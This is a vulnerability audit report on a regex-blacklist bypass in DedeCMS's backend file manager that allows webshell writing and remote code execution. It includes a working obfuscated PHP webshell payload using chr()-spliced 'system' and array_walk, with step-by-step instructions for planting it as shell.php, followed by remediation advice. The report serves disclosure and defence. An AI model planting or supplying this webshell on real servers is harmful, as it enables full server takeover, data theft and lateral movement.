# DedeCMS File Manager Regular Expression Bypass Remote Code Execution Vulnerability Audit Report
## I. Basic Vulnerability Information
| Attribute | Details |
|---|---|
| Vulnerability Name | DedeCMS File Manager Regular Expression Bypass Vulnerability for WebShell Writing & Remote Code Execution (RCE) |
| Vulnerability Type | Remote Code Execution (RCE) |
| Prerequisites | 1. Possess DedeCMS backend administrator privileges or access permissions for Plus file manager;<br>2. PHP environment version lower than 7.0, or supports parsing & executing `<script language="php">` tags;<br>3. The target website directory has write permissions for the PHP process. |
| Vulnerable Trigger File | dede/file_manage_control.php |
| Manufacturer Official Website | https://www.dedecms.com/ |
| Affected Versions | <= v5.7.118 |

## II. Step-by-Step Code Audit Analysis
### Vulnerability Trigger Points
Core vulnerable file: dede/file_manage_control.php
1. Lines 29–55: Three layers of blacklist detection for malicious code relying solely on text matching, with multiple bypass vulnerabilities;
2. Lines 107–112: `fmdo=edit` file writing branch only implements basic path filtering without subsequent security validation, allowing direct writing of malicious content.

#### Source Code: Three-Layer Malicious Code Detection
```php
// Layer 1: Regex matching to block dangerous functions
foreach (explode(",", $cfg_disable_funs) as $value) {
    if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{']#i", " {$str}") == TRUE) {
        die("DedeCMS Alert: Malicious code detected on current page!");
    }
}

// Layer 2: Detection for standard PHP tags & function variable calls
if(preg_match("#^[\s\S]+<\?(php\|=)?[\s]+#i", " {$str}") == TRUE) {
    if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$str}") == TRUE) {
        die("DedeCMS Alert: Malicious code detected on current page!");
    }
}

// Layer 3: Detection for @ variable functions & backtick command execution
// Full source code omitted; only signature-based interception is implemented
```

#### Source Code: File Writing Logic
```php
else if($fmdo=="edit")
{
    csrf_check();
    $filename = str_replace("..", "", $filename);
    $file = "$cfg_basedir$activepath/$filename";
    $str = stripslashes($str);
    $fp = fopen($file, "w");
    fputs($fp, $str);
    fclose($fp);
}
```

### Complete Exploit Chain Recap
1. Controllable Input Vector: Backend administrator sends POST request to `file_manage_control.php` with parameter `fmdo=edit` and valid CSRF Token; the `str` parameter is fully controllable for custom file content writing.
2. Bypass Layer 1 Detection: Avoid plaintext dangerous function names such as `system`; splice function names via `chr()` ASCII encoding. The original request payload contains intact sensitive function strings, evading the first-layer regex match.
3. Bypass Layer 2 Detection: Abandon standard `<?php>` tags, adopt non-standard `<script language="php">` tags supported by PHP <7.0 to evade PHP tag regex filtering; the payload contains no `$variable()` syntax and will not trigger secondary interception rules of the second layer.
4. Bypass Layer 3 Detection: The payload avoids high-risk features including `@$func()` and backticks, directly skipping third-layer security checks.
5. Auxiliary Bypass via Global Variable Registration: DedeCMS `common.inc.php` implements register_globals-like automatic variable registration. `$_GET[c]` is automatically converted to global variable `$c`, eliminating the need to write superglobal variables and bypassing keyword filtering.
6. Adapt Function Call Syntax: Conform to `array_walk` callback reference rules, construct array parameters to dynamically invoke spliced dangerous functions.
7. File Writing & Code Execution: The parameter is decoded via `stripslashes`, then malicious code is written directly into PHP site files. PHP versions below 7.0 parse non-standard script tags and execute spliced `system` functions to receive GET parameters and execute system commands, achieving remote code execution.

## III. Vulnerability Exploitation
### Backend Payload (Paste directly when creating/editing PHP files)
```php
<script language="php">
$a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$v=isset($c)?$c:'whoami';
$arr=array($v);
array_walk($arr,$a);
</script>
```

### Exploit process: 
1. Access /dede/ (default backend address) and log in with the backend account password; 
2. In “核心”, find “文件管理器”, select a directory and click “新建文件”; 
3. Fill in “文件名称”: shell.php, and in the box below, enter the file content:
```
<script language="php">
$a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$v=isset($c)?$c:'whoami';
$arr=array($v);
array_walk($arr,$a);
</script>
```
4. Click “保存”; 
5. Access the newly created file to obtain the server's execution result of the command "whoami".

### Lab Exploit Result
After submission, the page returns "File saved successfully" without malicious code blocking pop-ups. A backdoor file is generated in the website directory, and the file writing operation takes effect.

## IV. Vulnerability Impact Analysis
1. Low-threshold stable WebShell writing: No MySQL FILE privilege or global variable modification required. Only file manager backend access is needed. The exploit chain is shorter with a far higher success rate than conventional SQL injection file-write vulnerabilities.
2. Full server compromise: The backdoor accepts dynamic parameters to execute arbitrary system commands. Attackers can read full source code, database configurations and server private keys, tamper with website pages, erase business data, and gain complete control of the server.
3. Lateral movement risk: After compromising the host, attackers can scan internal network segments, access databases and middleware services to infiltrate and take over multiple intranet assets in batches.
4. Fundamental flaw in blacklist defense: All three layers of detection rely purely on text regular matching. Attackers can combine character encoding, non-standard PHP tags and automatic global variable registration to fully bypass native protection mechanisms.
5. Chain risk of account leakage: Backend admin accounts are vulnerable to leakage via weak passwords, historical exploits and phishing. Once compromised, attackers take over the entire server with severe consequences.

## V. Multi-Layer Remediation Recommendations
### 1. Global PHP Tag Interception for File Editor (dede/file_manage_control.php)
Discard the flawed original blacklist rules; implement dual mandatory interception to block both standard and non-standard PHP execution tags:
```php
if (preg_match('#<\?[\s\S]*?>#is', $str) 
    || preg_match('#<script\s+language\s*=\s*["\']?php#i', $str)) {
    die("DedeCMS Alert: PHP executable code is forbidden in files!");
}
```

### 2. Restrict Edit Permissions for Executable Scripts
- Option A: Disable creation and editing of all `.php`, `.phtml`, `.php3`, `.php4`, `.php5` script files via the backend editor;
- Option B: Force `htmlspecialchars()` encoding for all content written into script files to eliminate executable malicious code.

### 3. Add Detection for chr() Splicing Bypass
Add regex rules to identify continuous `chr(` ASCII encoding signatures to block attacks that split sensitive function names to evade filtering.

### 4. Environment-Level Backstop Protection
Upgrade PHP to version 7.0 or above. Newer PHP versions completely remove support for the non-standard `<script language="php">` tag, eliminating this bypass vector at runtime.

### 5. Remove Dangerous Automatic Global Variable Registration
Modify `include/common.inc.php` to disable register_globals-like automatic variable conversion from GET/POST requests, cutting off the bypass vector that leverages implicit global variable calls in malicious code.
